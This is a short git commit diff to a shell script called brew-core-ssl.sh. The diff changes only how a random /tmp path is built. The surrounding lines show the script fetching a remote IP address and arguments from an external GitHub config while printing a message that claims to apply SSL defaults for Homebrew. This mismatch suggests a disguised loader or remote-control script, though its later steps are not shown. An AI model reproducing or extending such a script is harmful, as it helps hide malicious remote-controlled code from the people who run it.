cba1c911b96744a44d8b5d122040beeb95204de4
svendev045 <126712757+svendev045@users.noreply.github.com>
2024-01-12 12:42:41 -0800

    Update brew-core-ssl.sh

--- brew-core-ssl.sh
+++ brew-core-ssl.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-tmp="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 12)"
+tmp="/tmp/$(od -vAn -N6 -tx1 /dev/urandom | tr -d " \n" | head -c 12)"
 ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
 args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
 echo "Applying SSL default for Brew core..."
